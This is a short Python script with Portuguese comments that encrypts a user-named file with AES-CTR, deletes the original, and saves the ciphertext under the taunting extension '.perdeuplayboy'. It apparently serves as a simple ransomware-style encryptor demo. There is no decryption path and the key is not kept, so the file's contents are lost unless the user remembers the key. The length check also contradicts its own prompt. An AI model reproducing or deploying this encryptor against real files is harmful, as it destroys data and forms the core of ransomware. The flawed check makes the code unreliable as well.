import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = input("Digite o nome do arquivo a ser encriptado: ")
file = open(file_name, "rb")
file_data = file.read()
file.close()




## chave de criptografia
key_input = input("Digite a chave de criptografia com pelo menos 16 caracteres: ")
if len(key_input) > 16:
  ## remover o arquivo
  os.remove(file_name)
  key = key_input.encode('utf-8')[:16]
  aes = pyaes.AESModeOfOperationCTR(key)

  ## criptografar o arquivo
  crypto_data = aes.encrypt(file_data)

  ## salvar o arquivo criptografado
  new_file = file_name + ".perdeuplayboy"
  new_file = open(f'{new_file}','wb')
  new_file.write(crypto_data)
  new_file.close()
else:
  print("Eu falei que era para ser mais de 16 caracteres!")
